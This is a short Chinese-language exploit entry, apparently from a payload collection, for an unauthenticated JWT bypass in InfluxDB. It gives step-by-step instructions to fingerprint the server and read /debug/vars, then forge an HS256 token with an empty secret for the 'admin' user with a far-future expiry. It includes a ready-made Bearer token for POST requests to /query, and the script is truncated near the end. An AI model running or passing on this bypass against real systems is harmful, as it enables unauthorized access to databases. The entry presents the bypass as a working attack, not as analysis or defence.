# InfluxDBJWT未授权漏洞

- **系统**：InfluxDBJWT　|　**类型**：认证/授权绕过　|　**CVE**：—

**请求体 / payload**
```
访问htp://IP:8086/query 查询功能有提示需要登录
抓包发现响应头带有X-Influxdb-Version标志头
访问htp://IP:8086/debug/vars 查看系统的服务信息
通过[https://jwt.io/#debugger-io](https://jwt.io/#debugger-io) 构造绕过身份验证所需的Token:
"alg": "HS256",
"typ": "JWT"
"username": "admin",
"exp": 4072615314
其中，username代表已存在的用户，exp是时间戳，代表该Token的过期时间，所以需要生成一个未来的时间戳（www.beijing-time.org/shijianchuo/），将secret值置空，得到编码后的Token：
抓取/query页面的数据包，将请求方式修改为POST，添加以下请求字段：
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo0MDcyNjE1MzE0fQ.mwI2P1j8CIvhxBKFvcyU7TNLBeuFtiUM1mPrKanF1w4
Content-Type: application/x-www-form-urlenc…（脚本共 830 字，完整版见原文）
```
- **预期**：200　|　—